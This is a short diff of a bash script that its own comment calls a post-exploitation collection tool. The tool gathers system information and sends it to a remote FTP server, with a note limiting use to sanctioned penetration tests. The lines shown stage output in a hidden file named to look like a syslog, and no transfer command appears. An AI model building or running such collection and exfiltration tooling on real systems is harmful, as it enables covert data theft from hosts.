@@ -1,4 +1,10 @@
 #!/bin/bash
+set -euo pipefail
+
+# Minimal post‑exploitation collection script. It gathers basic system
+# information and sends it to a remote FTP server for analysis. This
+# exfiltration mechanism must only be used in authorized contexts such as
+# sanctioned penetration tests. Using it without permission is prohibited.
 
 OUT="/dev/shm/.syslog.tmp"
 > "$OUT"
